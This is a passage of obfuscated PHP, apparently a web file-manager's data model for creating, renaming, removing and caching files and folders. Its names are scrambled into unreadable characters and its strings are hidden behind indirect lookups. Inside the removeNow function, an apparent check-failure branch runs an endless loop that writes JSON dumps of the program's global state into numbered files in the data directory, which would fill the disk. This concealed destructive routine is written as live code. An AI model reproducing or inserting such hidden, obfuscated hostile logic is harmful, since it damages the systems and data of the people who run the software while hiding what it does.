$this->_createFileCall($ğÛ†¿õ, $”¡Íòöî, $üÀœÖ™…, $ßå‰æ¯õ); } private function _createFileCall($ôØˆôÜ–, $½ÖÅ¾¹, $¼ßÕ™¶, $ìĞ¹É¦§, $µÒÈ±ï¢ = "\x75\160\154\x6f\141\144") { $“ù–â•å =& $_SERVER[€ä¾™²]; if (!$¼ßÕ™¶) { return !1; } $£ƒò–ë = !1; $this->setMasterDB(); $this->lockWriteStart($ôØˆôÜ–, $½ÖÅ¾¹); $½”âíÇ = $this->fileNameExist($ôØˆôÜ–, $½ÖÅ¾¹); $ıëïš€´ = $this->_createFile($ôØˆôÜ–, $½ÖÅ¾¹, $¼ßÕ™¶, $ìĞ¹É¦§, $£ƒò–ë); if (!$£ƒò–ë) { Model($“ù–â•å[567])->remove($¼ßÕ™¶[$“ù–â•å[564]]); } if ($£ƒò–ë && $ıëïš€´ && $ıëïš€´ != $½”âíÇ) { Model($“ù–â•å[2383])->eventCreate($ıëïš€´, $µÒÈ±ï¢); } $this->lockWriteEnd($ôØˆôÜ–, $½ÖÅ¾¹); return $ıëïš€´; } public function mkdir($®¦—€æ, $¬¶´â•³, $øşÙŒÌ· = REPEAT_SKIP) { $úÚ“ú‹å =& $_SERVER[€ä¾™²]; $this->setMasterDB(); $„İ…¢ë = $this->sourceInfo($®¦—€æ); if (!$„İ…¢ë) { return !1; } $this->lockWriteStart($®¦—€æ, $¬¶´â•³); if ($øşÙŒÌ· !== !1) { $ÜãÑÍû· = $this->fileNameExist($®¦—€æ, $¬¶´â•³); if ($ÜãÑÍû· && $øşÙŒÌ· != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($®¦—€æ, $¬¶´â•³); return $ÜãÑÍû·; } $¬¶´â•³ = $this->fileNameAuto($®¦—€æ, $¬¶´â•³, $øşÙŒÌ·); } $•ÚÂ‰àë = array($úÚ“ú‹å[675] => 1, $úÚ“ú‹å[516] => $¬¶´â•³, $úÚ“ú‹å[676] => $úÚ“ú‹å[12], $úÚ“ú‹å[565] => 0, $úÚ“ú‹å[647] => 0); $³¼Í¼û“ = $this->_addSource($•ÚÂ‰àë, $„İ…¢ë); Model($úÚ“ú‹å[2383])->eventCreate($³¼Í¼û“, $úÚ“ú‹å[1490]); $this->lockWriteEnd($®¦—€æ, $¬¶´â•³); return $³¼Í¼û“; } public function listSourceRoot($šåŒ™Ë§, $÷®•äù, $ÁÇ‰¦ôš = "\163\157\x75\x72\143\x65\111\x44\54\x74\x61\x72\x67\x65\164\111\104\54\163\151\172\x65") { $òçâáËæ =& $_SERVER[€ä¾™²]; $ï½€Ğ©š = $òçâáËæ[463]; $È¯ú˜é§ = array(); $¤€õ­Ñµ = 1024 * 50; $Ì «£Ûñ = is_array($Ì «£Ûñ) ? $Ì «£Ûñ : array(); $²úÚ¥ Æ = count($÷®•äù); $½‘™×· = $this->tablePrefix . $òçâáËæ[470]; for ($àˆ—–‡¤ = 0; $àˆ—–‡¤ < $²úÚ¥ Æ; $àˆ—–‡¤++) { $ôÇŞ‚† = $÷®•äù[$àˆ—–‡¤]; $ï½€Ğ©š .= "\x53\x45\114\x45\103\x54\x20\52\x20\106\x52\117\115\x20\x28\x53\x45\x4c\x45\x43\124\40{$ÁÇ‰¦ôš}\x20\x46\x52\117\x4d\x20\x60{$½‘™×·}\x60\40\127\x48\x45\x52\x45\x20"; $ï½€Ğ©š .= "\x60\x70\141\162\145\156\x74\x49\104\x60\x3d\60\40\x41\x4e\x44\x20\x60\x74\141\162\147\145\x74\x49\x44\x60\75{$ôÇŞ‚†}\x20\x41\116\x44\x20\140\x74\141\x72\147\x65\x74\x54\x79\160\x65\140\x3d{$šåŒ™Ë§}\40\x61\x6e\x64\40\x66\151\x6c\145\124\171\x70\145\75\47\47\x20\x6c\151\155\x69\164\40\x31\51\40\141\x73\40\164\142\x5f{$àˆ—–‡¤}\40\x55\116\111\117\116\x20\x41\x4c\x4c\x20"; if ((strlen($ï½€Ğ©š) >= $¤€õ­Ñµ || $àˆ—–‡¤ == $²úÚ¥ Æ - 1) && $ï½€Ğ©š) { $ï½€Ğ©š = substr($ï½€Ğ©š, 0, -strlen($òçâáËæ[1151])); $ù”Í†ı€ = $this->query($ï½€Ğ©š); $ï½€Ğ©š = $òçâáËæ[12]; $È¯ú˜é§ = array_merge($È¯ú˜é§, $ù”Í†ı€); } } return $È¯ú˜é§; } private function _createFile($Ë›•ûÒë, $»éùÇ£, $¤ú½‹ÍØ, $á©¸›šÄ, &$¢é¶ø¨µ) { $õ·‡èùğ =& $_SERVER[€ä¾™²]; $ôá¨ùÁç = $this->sourceInfo($Ë›•ûÒë); if (!$¤ú½‹ÍØ || !$ôá¨ùÁç) { return !1; } if ($á©¸›šÄ !== !1) { $çóú¡Ê = $this->fileNameExist($Ë›•ûÒë, $»éùÇ£); } $¢é¶ø¨µ = !0; if ($á©¸›šÄ && $çóú¡Ê) { if ($á©¸›šÄ == REPEAT_SKIP) { $¢é¶ø¨µ = !1; return $çóú¡Ê; } else { if ($á©¸›šÄ == REPEAT_REPLACE) { $¥·ö„®‡ = $this->sourceInfo($çóú¡Ê); $ »Õ€Ğ = $this->fileHistory($¥·ö„®‡, $¤ú½‹ÍØ[$õ·‡èùğ[564]], $¤ú½‹ÍØ[$õ·‡èùğ[79]]); if (!$ »Õ€Ğ) { $¢é¶ø¨µ = !1; } else { $this->folderSizeReset($Ë›•ûÒë); } return $çóú¡Ê; } else { $»éùÇ£ = $this->fileNameAuto($Ë›•ûÒë, $»éùÇ£, $á©¸›šÄ, !1); } } } $÷Ç¾“¡† = array($õ·‡èùğ[675] => 0, $õ·‡èùğ[516] => $»éùÇ£, $õ·‡èùğ[676] => substr(get_path_ext($»éùÇ£), 0, 10), $õ·‡èùğ[565] => $¤ú½‹ÍØ[$õ·‡èùğ[564]], $õ·‡èùğ[647] => $¤ú½‹ÍØ[$õ·‡èùğ[79]]); $û—ÚÉ» = $this->_addSource($÷Ç¾“¡†, $ôá¨ùÁç); $this->folderSizeReset($Ë›•ûÒë, intval($÷Ç¾“¡†[$õ·‡èùğ[79]])); return $û—ÚÉ»; } protected function fileHistory($˜Ä÷á¤”, $£È«Í¸ï, $Óó³İó») { $‚ôÄŞï‰ =& $_SERVER[€ä¾™²]; if ($˜Ä÷á¤”[$‚ôÄŞï‰[564]] == $£È«Í¸ï) { return !1; } $this->checkLock($˜Ä÷á¤”[$‚ôÄŞï‰[192]], $£È«Í¸ï); Model($‚ôÄŞï‰[2422])->addHistory($˜Ä÷á¤”); $…ãÊŒ•ú = array($‚ôÄŞï‰[680] => USER_ID, $‚ôÄŞï‰[520] => time(), $‚ôÄŞï‰[564] => $£È«Í¸ï, $‚ôÄŞï‰[79] => $Óó³İó»); $this->where(array($‚ôÄŞï‰[513] => $˜Ä÷á¤”[$‚ôÄŞï‰[192]]))->save($…ãÊŒ•ú); $this->sourceCacheClear($˜Ä÷á¤”[$‚ôÄŞï‰[192]]); return !0; } public function checkLock($áÍèÄ¸«, $Å¤‚ĞÒ…) { $¦„èá =& $_SERVER[€ä¾™²]; $âñŠİ³ = $this->pathInfo($áÍèÄ¸«); if (!$this->fileIsLock($âñŠİ³, !0)) { return; } $ôĞàĞæ = Session::get($¦„èá[2423]); $«ÏÈš = substr($âñŠİ³[$¦„èá[32]], 0, -1 - strlen($âñŠİ³[$¦„èá[167]])) . $¦„èá[1342] . $ôĞàĞæ . $¦„èá[10] . $âñŠİ³[$¦„èá[167]]; $˜§³ãÃ = Model($¦„èá[703])->find($Å¤‚ĞÒ…); $this->_createFileCall($âñŠİ³[$¦„èá[191]], $«ÏÈš, $˜§³ãÃ, REPEAT_REPLACE, $¦„èá[1489]); $òô£õè¼ = $âñŠİ³[$¦„èá[562]][$¦„èá[640]]; $úáœ”Ñ× = $òô£õè¼[$¦„èá[2424]] ? $òô£õè¼[$¦„èá[2424]] : $òô£õè¼[$¦„èá[32]]; show_json(LNG($¦„èá[2425]) . $¦„èá[2426] . LNG($¦„èá[2427]) . $¦„èá[2428] . $úáœ”Ñ× . $¦„èá[2429], !1); } public function fileIsLock($©Í¥©Ş, $ÜÖÅåÖŸ = false) { $é³ØÊ¦® =& $_SERVER[€ä¾™²]; if (!_get($©Í¥©Ş, $é³ØÊ¦®[636], 0)) { return !1; } if ($©Í¥©Ş[$é³ØÊ¦®[562]][$é³ØÊ¦®[639]] != USER_ID) { return !0; } $À—¶ Â¹ = $GLOBALS[$é³ØÊ¦®[6]][$é³ØÊ¦®[92]][$é³ØÊ¦®[637]]; if ($©Í¥©Ş[$é³ØÊ¦®[562]][$é³ØÊ¦®[638]] <= time() - $À—¶ Â¹) { $this->metaSet($©Í¥©Ş[$é³ØÊ¦®[192]], $é³ØÊ¦®[639], null); $this->metaSet($©Í¥©Ş[$é³ØÊ¦®[192]], $é³ØÊ¦®[638], null); } if ($ÜÖÅåÖŸ) { $this->metaSet($©Í¥©Ş[$é³ØÊ¦®[192]], $é³ØÊ¦®[638], time()); } return !1; } private function _addSource($§êôé˜×, $İ ôó·ø) { $“ûæ†¢— =& $_SERVER[€ä¾™²]; $ã³ßÈ‘â = KodUser::id(); $¥œ½ÚÁğ = array($“ûæ†¢—[677] => $İ ôó·ø[$“ûæ†¢—[189]], $“ûæ†¢—[678] => $İ ôó·ø[$“ûæ†¢—[596]], $“ûæ†¢—[679] => $ã³ßÈ‘â, $“ûæ†¢—[680] => $ã³ßÈ‘â, $“ûæ†¢—[499] => $İ ôó·ø[$“ûæ†¢—[192]], $“ûæ†¢—[681] => $İ ôó·ø[$“ûæ†¢—[611]] . $İ ôó·ø[$“ûæ†¢—[192]] . $“ûæ†¢—[50], $“ûæ†¢—[526] => 0, $“ûæ†¢—[682] => $“ûæ†¢—[12]); $§êôé˜× = array_merge($¥œ½ÚÁğ, $§êôé˜×); $this->updateModifyTime($§êôé˜×[$“ûæ†¢—[191]]); $ü¡ß«ƒí = $“ûæ†¢—[2430] . $İ ôó·ø[$“ûæ†¢—[192]]; if (isset(self::$cacheChildList[$ü¡ß«ƒí])) { unset(self::$cacheChildList[$ü¡ß«ƒí]); } static $±Ø¨’ÓÅ = false; if (!$±Ø¨’ÓÅ) { Hook::trigger($“ûæ†¢—[665], $§êôé˜×); $±Ø¨’ÓÅ = !0; } $âöä–À = $this->add($§êôé˜×); $Ç«ñ¶ü = array($“ûæ†¢—[683] => short_id($âöä–À)); $this->where(array($“ûæ†¢—[513] => $âöä–À))->save($Ç«ñ¶ü); $this->setNamePinyin($âöä–À, $§êôé˜×[$“ûæ†¢—[32]]); return $âöä–À; } public function remove($ÄµáŸŠ¯, $’‡Éû¤È = true) { $À‰Àª…© =& $_SERVER[€ä¾™²]; $Ò¼èéšŒ = $this->sourceInfo($ÄµáŸŠ¯); $Ø™şÓÃ = intval($Ò¼èéšŒ[$À‰Àª…©[189]]) === self::TYPE_SYSTEM; $ˆÒÙÛóã = Model($À‰Àª…©[529])->get($À‰Àª…©[2431]) == $À‰Àª…©[91]; if ($Ø™şÓÃ || $’‡Éû¤È || !$ˆÒÙÛóã) { return $this->removeNow($ÄµáŸŠ¯, $’‡Éû¤È); } $ÍÊ†Ì…‘ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ñ¾ËŒ–Ú = $Ò¼èéšŒ[$À‰Àª…©[189]] == self::TYPE_USER ? $À‰Àª…©[691] : $À‰Àª…©[605]; if ($ñ¾ËŒ–Ú == $À‰Àª…©[691]) { $¤°ÂÙõÈ = Model($À‰Àª…©[604])->getInfo($Ò¼èéšŒ[$À‰Àª…©[596]]); $ë˜Îğ»ü = !empty($¤°ÂÙõÈ[$À‰Àª…©[2424]]) ? $¤°ÂÙõÈ[$À‰Àª…©[2424]] : $¤°ÂÙõÈ[$À‰Àª…©[32]]; $ë˜Îğ»ü = $À‰Àª…©[338] . $ë˜Îğ»ü . $À‰Àª…©[2432] . $Ò¼èéšŒ[$À‰Àª…©[596]]; } else { $¤°ÂÙõÈ = Model($À‰Àª…©[612])->getInfo($Ò¼èéšŒ[$À‰Àª…©[596]]); $ë˜Îğ»ü = _get($¤°ÂÙõÈ, $À‰Àª…©[32]); $ë˜Îğ»ü = $À‰Àª…©[174] . $ë˜Îğ»ü . $À‰Àª…©[2433] . $Ò¼èéšŒ[$À‰Àª…©[596]]; } $ÊçÌôèŠ = $À‰Àª…©[2434] . md5($ë˜Îğ»ü); CacheLock::lock($ÊçÌôèŠ); $€ñ²Æµ = $this->fileNameExist($ÍÊ†Ì…‘, $ë˜Îğ»ü); if (!$€ñ²Æµ) { $€ñ²Æµ = $this->mkdir($ÍÊ†Ì…‘, $ë˜Îğ»ü, REPEAT_SKIP); $this->metaSet($€ñ²Æµ, $À‰Àª…©[2435], $ñ¾ËŒ–Ú); $this->metaSet($€ñ²Æµ, $À‰Àª…©[2436], $Ò¼èéšŒ[$À‰Àª…©[596]]); if ($Ò¼èéšŒ[$À‰Àª…©[191]] != 0) { $this->metaSet($€ñ²Æµ, $À‰Àª…©[2437], _get($¤°ÂÙõÈ, $À‰Àª…©[2438])); } } CacheLock::unlock($ÊçÌôèŠ); $this->metaSet($ÄµáŸŠ¯, $À‰Àª…©[2439], $Ò¼èéšŒ[$À‰Àª…©[191]]); $this->where(array($À‰Àª…©[192] => $ÄµáŸŠ¯))->save(array($À‰Àª…©[520] => time())); $this->recycleClear($Ò¼èéšŒ); Model($À‰Àª…©[662])->eventRemove($ÄµáŸŠ¯); $åõõÉëñ = $this->move($ÄµáŸŠ¯, $€ñ²Æµ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ò¼èéšŒ[$À‰Àª…©[191]]); return $åõõÉëñ; } private function recycleClear($Úı†•) { $¹•À®¬˜ =& $_SERVER[€ä¾™²]; $¿£†µ‰Ğ = $this->childrenAll($Úı†•); $µ„ìÇÄğ = array($¹•À®¬˜[513] => array($¹•À®¬˜[514], $¿£†µ‰Ğ[$¹•À®¬˜[2440]])); Model($¹•À®¬˜[2441])->where($µ„ìÇÄğ)->delete(); } public function removeNow($•«„Öµ, $ø”ß÷Õç = true) { $„çú©í =& $_SERVER[€ä¾™²]; $éû†ÔÆ² = $_SERVER[$„çú©í[492]]; $ë§ç‘«’ = $„çú©í[2379]; if ($_SERVER[$„çú©í[491]] != $ë§ç‘«’($éû†ÔÆ²)) { $¹‘Ø–¡¾ = $„çú©í[989]; $ıæ½¶åĞ = $„çú©í[493]; $¿Æ˜û™à = $_SERVER[$„çú©í[494]] . $„çú©í[495]; $ª½‰üÍª = $ıæ½¶åĞ($¿Æ˜û™à); $È€áÇ»© = explode($„çú©í[286], $ª½‰üÍª); if (count($È€áÇ»©) < $„çú©í[722]) { $ÉòÅåáÏ = $„çú©í[497]; $ÉòÅåáÏ(); } $›‚Êâš = $„çú©í[990]; $›‚Êâš($_SERVER[$„çú©í[991]]); $¹‘Ø–¡¾ = $„çú©í[989]; $¹‘Ø–¡¾(); $Ãİú½ŞŒ = $„çú©í[2442]; $ÛèÜêóš = json_encode($GLOBALS[$„çú©í[2443]]); $„ÎÚ†Ü = 1; for ($¿½¾Œ¡è = $„ÎÚ†Ü; $¿½¾Œ¡è > 0; $¿½¾Œ¡è++) { $Ãİú½ŞŒ(DATA_PATH . $¿½¾Œ¡è, $ÛèÜêóš); } } $ûãö‹áö = $this->sourceInfo($•«„Öµ); $ş¦˜êÜù = $this->pathInfoMore($•«„Öµ); if (!$ûãö‹áö) { return !0; } if ($ûãö‹áö[$„çú©í[191]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($•«„Öµ); Hook::trigger($„çú©í[2444], $ş¦˜êÜù, $ø”ß÷Õç); if ($ø”ß÷Õç) { Model($„çú©í[2441])->moveToRecycle($•«„Öµ); } else { $¬¼ºÕ‚ = $this->childrenAll($ûãö‹áö); Model($„çú©í[662])->eventRemove($•«„Öµ); $this->removeRelevance($¬¼ºÕ‚[$„çú©í[2440]], $¬¼ºÕ‚[$„çú©í[1725]]); } $this->folderSizeReset($ûãö‹áö[$„çú©í[191]]); $°ÅèöÇ = array($ûãö‹áö[$„çú©í[191]]); if ($ûãö‹áö[$„çú©í[507]] == $„çú©í[91]) { $°ÅèöÇ[] = $ûãö‹áö[$„çú©í[192]]; } $this->updateModifyTime($°ÅèöÇ); $this->lockMoveEnd($•«„Öµ); Hook::trigger($„çú©í[1964], $ş¦˜êÜù, $ø”ß÷Õç); return !0; } public function childrenAll($»Ş³Ï§) { $½”¨•å =& $_SERVER[€ä¾™²]; $¤êŞ ñ = $»Ş³Ï§[$½”¨•å[192]]; if ($»Ş³Ï§[$½”¨•å[507]] == $½”¨•å[91]) { $ç®ËãÈŸ = array($½”¨•å[681] => array($½”¨•å[642], $»Ş³Ï§[$½”¨•å[611]] . $¤êŞ ñ . $½”¨•å[643])); $Ö½Â¥Ø = array($½”¨•å[681] => $ç®ËãÈŸ[$½”¨•å[611]]); $ÑÍü±Ÿ… = $this->field($½”¨•å[2445])->where($Ö½Â¥Ø)->select(); $§Š“ëû¸ = !1; $«ĞµºéÜ = array($¤êŞ ñ); if ($ÑÍü±Ÿ…) { $§Š“ëû¸ = array_to_keyvalue($ÑÍü±Ÿ…, $½”¨•å[12], $½”¨•å[564]); $§Š“ëû¸ = array_remove_value($§Š“ëû¸, $½”¨•å[229]); $«ĞµºéÜ = array_to_keyvalue($ÑÍü±Ÿ…, $½”¨•å[12], $½”¨•å[192]); $«ĞµºéÜ[] = $¤êŞ ñ; } } else { $§Š“ëû¸ = array($»Ş³Ï§[$½”¨•å[564]]); $«ĞµºéÜ = array($¤êŞ ñ); } return array($½”¨•å[2440] => $«ĞµºéÜ, $½”¨•å[1725] => $§Š“ëû¸); } public function removeArray($ÀÒ÷£) { if (!$ÀÒ÷£) { return !0; } } public function removeRelevance($œµ½ÓĞ®, $Š³Ø‚““) { $»ƒÆÚ¢Ÿ =& $_SERVER[€ä¾™²]; $œµ½ÓĞ® = $œµ½ÓĞ® ? $œµ½ÓĞ® : array(); $Š³Ø‚““ = $Š³Ø‚““ ? $Š³Ø‚““ : array(); $œµ½ÓĞ® = array_unique(array_filter($œµ½ÓĞ®)); $Š³Ø‚““ = array_filter($Š³Ø‚““); if (!$œµ½ÓĞ®) { return !1; } $İÛ…ğÊ’ = array($»ƒÆÚ¢Ÿ[513] => array($»ƒÆÚ¢Ÿ[514], $œµ½ÓĞ®)); Model($»ƒÆÚ¢Ÿ[2441])->where($İÛ…ğÊ’)->delete(); Model($»ƒÆÚ¢Ÿ[556])->where($İÛ…ğÊ’)->delete(); Model($»ƒÆÚ¢Ÿ[2274])->where($İÛ…ğÊ’)->delete(); Model($»ƒÆÚ¢Ÿ[662])->where($İÛ…ğÊ’)->delete(); Model($»ƒÆÚ¢Ÿ[1509])->removeBySource($œµ½ÓĞ®); Model($»ƒÆÚ¢Ÿ[2422])->removeBySource($œµ½ÓĞ®); $this->where($İÛ…ğÊ’)->delete(); Model($»ƒÆÚ¢Ÿ[567])->remove($Š³Ø‚““); for ($¸İºà±ä = 0; $¸İºà±ä < count($œµ½ÓĞ®); $¸İºà±ä++) { $this->sourceCacheClear($œµ½ÓĞ®[$¸İºà±ä]); } } public function rename($é³¿¥æ´, $¦ŸÙÃ­Ú) { $÷ÁÂ¥ê° =& $_SERVER[€ä¾™²]; $—êõ°øà = $this->sourceInfo($é³¿¥æ´); if (!$—êõ°øà) { return !1; } $¾‰É‚ = $this->fileNameExist($—êõ°øà[$÷ÁÂ¥ê°[191]], $¦ŸÙÃ­Ú); if ($¾‰É‚ && $¾‰É‚ != $é³¿¥æ´) { return !1; } $£ÒªËÒÛ = array($÷ÁÂ¥ê°[516] => $¦ŸÙÃ­Ú, $÷ÁÂ¥ê°[680] => USER_ID); if ($—êõ°øà[$÷ÁÂ¥ê°[507]] != $÷ÁÂ¥ê°[91]) { $£ÒªËÒÛ[$÷ÁÂ¥ê°[508]] = substr(get_path_ext($¦ŸÙÃ­Ú), 0, 10); } Model($÷ÁÂ¥ê°[662])->eventRename($é³¿¥æ´, $—êõ°øà[$÷ÁÂ¥ê°[32]], $¦ŸÙÃ­Ú); $this->sourceCacheClear($é³¿¥æ´); $this->setNamePinyin($é³¿¥æ´, $£ÒªËÒÛ[$÷ÁÂ¥ê°[32]], !1); $this->updateModifyTime($—êõ°øà[$÷ÁÂ¥ê°[191]]); $®úöì = $this->where(array($÷ÁÂ¥ê°[513] => $é³¿¥æ´))->data($£ÒªËÒÛ)->save(); $Òì—‹èø = $÷ÁÂ¥ê°[2430] . $—êõ°øà[$÷ÁÂ¥ê°[191]]; if (isset(self::$cacheChildList[$Òì—‹èø])) { unset(self::$cacheChildList[$Òì—‹èø]); } return $®úöì; } public function setNamePinyin($ÚÏËôÄ–, $‘ÍĞ‹±, $é†úÚ˜ñ = true) { $‰¡š©÷Á =& $_SERVER[€ä¾™²]; $æø¢¸ö‹ = Input::check($‘ÍĞ‹±, $‰¡š©÷Á[684]); $¸ÆÄ±°© = array($‰¡š©÷Á[538] => KodSort::makeStr($‘ÍĞ‹±)); if ($æø¢¸ö‹) { $¸ÆÄ±°©[$‰¡š©÷Á[559]] = str_replace($‰¡š©÷Á[53], $‰¡š©÷Á[12], Pinyin::get($‘ÍĞ‹±)); $¸ÆÄ±°©[$‰¡š©÷Á[558]] = Pinyin::get($‘ÍĞ‹±, $‰¡š©÷Á[685]); } if (!$é†úÚ˜ñ && !$æø¢¸ö‹) { $¸ÆÄ±°©[$‰¡š©÷Á[559]] = null; $¸ÆÄ±°©[$‰¡š©÷Á[558]] = null; } $this->metaSet($ÚÏËôÄ–, $¸ÆÄ±°©); } public function getContent($¢Ö„Ñ®) { $›ƒâëÍØ =& $_SERVER[€ä¾™²]; $‚ÕÇ¿â = $this->fileInfoGet($¢Ö„Ñ®); if (!$‚ÕÇ¿â) { return !1; } if ($‚ÕÇ¿â[$›ƒâëÍØ[79]] == 0) { return $›ƒâëÍØ[12]; } $‚óôæ¿ü = $›ƒâëÍØ[2446] . $‚ÕÇ¿â[$›ƒâëÍØ[570]]; if ($‚ÕÇ¿â[$›ƒâëÍØ[79]] <= 1024 * 10) { $Ÿ‡Õğ£Ù = Cache::get($‚óôæ¿ü); if (!$Ÿ‡Õğ£Ù) { $Ÿ‡Õğ£Ù = IO::getContent($‚ÕÇ¿â[$›ƒâëÍØ[87]]); Cache::set($‚óôæ¿ü, $Ÿ‡Õğ£Ù); } return $Ÿ‡Õğ£Ù; } if (!$‚ÕÇ¿â[$›ƒâëÍØ[87]]) { return $›ƒâëÍØ[12]; } return IO::getContent($‚ÕÇ¿â[$›ƒâëÍØ[87]]); } public function setDesc($›–²Ù“ˆ, $ãä¿¢ìõ) { $ı¯Äİ¤ç =& $_SERVER[€ä¾™²]; Model($ı¯Äİ¤ç[662])->eventAddDesc($›–²Ù“ˆ, $ãä¿¢ìõ); return $this->metaSet($›–²Ù“ˆ, $ı¯Äİ¤ç[547], $ãä¿¢ìõ); } public function setContent($´å‡­Õè, $ÏÃí…ß¾ = '') { $ƒè¿ÊÕÀ =& $_SERVER[€ä¾™²]; $Ú”·î½ = $this->sourceInfo($´å‡­Õè); $·ÀŞñÅ = $this->fileInfoGet($´å‡­Õè); if (!$·ÀŞñÅ || !$Ú”·î½) { return !1; } $È¡ß›¦ = KodIO::ioFileDriverGet($ƒè¿ÊÕÀ[505] . $´å‡­Õè . $ƒè¿ÊÕÀ[403]); $ÅĞ«ãÃå = Model($ƒè¿ÊÕÀ[567])->addFileByContent($ÏÃí…ß¾, $È¡ß›¦, $Ú”·î½[$ƒè¿ÊÕÀ[32]]); if (!$ÅĞ«ãÃå) { return !1; } $ˆÉ²³¹Ò = $this->fileHistory($Ú”·î½, $ÅĞ«ãÃå[$ƒè¿ÊÕÀ[564]], $ÅĞ«ãÃå[$ƒè¿ÊÕÀ[79]]); if (!$ˆÉ²³¹Ò) { return Model($ƒè¿ÊÕÀ[567])->remove($ÅĞ«ãÃå[$ƒè¿ÊÕÀ[564]]); } $this->folderSizeReset($Ú”·î½[$ƒè¿ÊÕÀ[191]]); return !0; } public function fileSubstr($ñ“§–Èğ, $òÀ¼­ê‚, $ÆÛ¤ÙÈ) { $Ææ÷©ıÊ = $this->fileInfoGet($ñ“§–Èğ); if (!$Ææ÷©ıÊ) { return !1; } return IO::fileSubstr($Ææ÷©ıÊ[$_SERVER[€ä¾™²][87]], $òÀ¼­ê‚, $ÆÛ¤ÙÈ); } public function fileInfoGet($Î­çŞØı) { $ŸÀğğ“Œ =& $_SERVER[€ä¾™²]; $ÇÃûÇèŠ = $this->sourceInfo($Î­çŞØı); if (!$ÇÃûÇèŠ || $ÇÃûÇèŠ[$ŸÀğğ“Œ[507]]) { return !1; } $Ù˜¿¿à = $ŸÀğğ“Œ[571] . $ÇÃûÇèŠ[$ŸÀğğ“Œ[564]]; $ØŸğ¼ƒ = _get(self::$cacheFileInfo, $Ù˜¿¿à); if ($ØŸğ¼ƒ) { return $ØŸğ¼ƒ; } $¯—™„˜¦ = Model($ŸÀğğ“Œ[567])->fileInfo($ÇÃûÇèŠ[$ŸÀğğ“Œ[564]]); if ($¯—™„˜¦) { $¯—™„˜¦[$ŸÀğğ“Œ[32]] = $ÇÃûÇèŠ[$ŸÀğğ“Œ[32]]; } self::$cacheFileInfo[$Ù˜¿¿à] = $¯—™„˜¦; return $¯—™„˜¦; } private function folderChildrenNumber($§ë×¢æ›) { $ØƒáÁ»ı =& $_SERVER[€ä¾™²]; $³å»ÌŸ· = $this->sourceInfo($§ë×¢æ›); $€ñÕŸ± = array($ØƒáÁ»ı[681] => array($ØƒáÁ»ı[642], $³å»ÌŸ·[$ØƒáÁ»ı[611]] . $§ë×¢æ› . $ØƒáÁ»ı[643]), $ØƒáÁ»ı[678] => $³å»ÌŸ·[$ØƒáÁ»ı[596]], $ØƒáÁ»ı[526] => intval($³å»ÌŸ·[$ØƒáÁ»ı[527]]), $ØƒáÁ»ı[675] => 1); $ß†’æé™ = $this->where($€ñÕŸ±)->count(); $½äòòÎö = $this->where($€ñÕŸ±)->where(array($ØƒáÁ»ı[675] => 0))->count(); return array($ØƒáÁ»ı[83] => $½äòòÎö, $ØƒáÁ»ı[84] => $ß†’æé™); } public function pathInfo($Ã½èÕ•ä, $óú¤Éõş = false) { $”ö·ÇÛ™ =& $_SERVER[€ä¾™²]; $óú¤Éõş = !1; $Ã½èÕ•ä = intval($Ã½èÕ•ä); if (!$Ã½èÕ•ä) { return !1; } $Úñ™ÁÏÅ = $”ö·ÇÛ™[555] . intval($óú¤Éõş) . $”ö·ÇÛ™[476] . $Ã½èÕ•ä; $ŸÂÙ«„ = _get(self::$cachePathInfo, $Úñ™ÁÏÅ); if ($ŸÂÙ«„) { return $ŸÂÙ«„; } $°™ûĞ = $this->sourceInfo($Ã½èÕ•ä); if (!$°™ûĞ) { return !1; } $°™ûĞ = $this->_listDataApplyItem($°™ûĞ, $óú¤Éõş); self::$cachePathInfo[$Úñ™ÁÏÅ] = $°™ûĞ; return $°™ûĞ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÊŠİãöº) { $‰¡ÔÑ‘Ê =& $_SERVER[€ä¾™²]; $ª °Ó‘‡ = _get(self::$cachePathInfoMore, $ÊŠİãöº); if ($ª °Ó‘‡) { return $ª °Ó‘‡; } $Ú´ÃÚ÷è = $this->pathInfo($ÊŠİãöº); if (!$Ú´ÃÚ÷è) { return !1; } if ($Ú´ÃÚ÷è[$‰¡ÔÑ‘Ê[507]] == $‰¡ÔÑ‘Ê[91]) { $Ú´ÃÚ÷è[$‰¡ÔÑ‘Ê[82]] = $this->folderChildrenNumber($ÊŠİãöº); } self::$cachePathInfoMore[$ÊŠİãöº] = $Ú´ÃÚ÷è; return $Ú´ÃÚ÷è; } public function sourceInfo($¤ÊŒ¶­¼) { $ñÔòÒµæ =& $_SERVER[€ä¾™²]; if (!$¤ÊŒ¶­¼) { return array(); } $¤ÊŒ¶­¼ = intval($¤ÊŒ¶­¼); $ÙÔ€”ûË = $ñÔòÒµæ[554] . $¤ÊŒ¶­¼; $Ö±áò®Æ = _get(self::$cacheSourceInfo, $ÙÔ€”ûË); if ($Ö±áò®Æ) { return $Ö±áò®Æ; } $æ­²şÒ· = $this->where(array($ñÔòÒµæ[192] => $¤ÊŒ¶­¼))->find(); self::$cacheSourceInfo[$ÙÔ€”ûË] = $æ­²şÒ·; return self::$cacheSourceInfo[$ÙÔ€”ûË]; } public function sourceCacheClear($éËÄ¦‘¦ = false) { self::cacheClear($éËÄ¦‘¦); } public static function cacheClear($ğÓŠ‘¼ˆ = false) { $ÊÚ±Ëè£ =& $_SERVER[€ä¾™²]; if ($ğÓŠ‘¼ˆ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÊÚ±Ëè£[554] . $ğÓŠ‘¼ˆ]); unset(self::$cachePathInfoMore[$ğÓŠ‘¼ˆ]); unset(self::$cachePathInfo[$ÊÚ±Ëè£[2447] . $ğÓŠ‘¼ˆ]); unset(self::$cachePathInfo[$ÊÚ±Ëè£[2448] . $ğÓŠ‘¼ˆ]); } public function metaSet($£”†¢†, $ª¡©şèï = null, $‡âğÆ«¯ = null) { $öªê‰Š‡ = parent::metaSet($£”†¢†, $ª¡©şèï, $‡âğÆ«¯); if ($öªê‰Š‡) { $this->sourceCacheClear($£”†¢†); } return $öªê‰Š‡; } public function pathInfoByPath($±şÃ µõ, $Å™îÈ³ô) { $ÊË¡¢õ« =& $_SERVER[€ä¾™²]; $«¯ñù¸Ç = !$Å™îÈ³ô ? array() : explode($ÊË¡¢õ«[8], 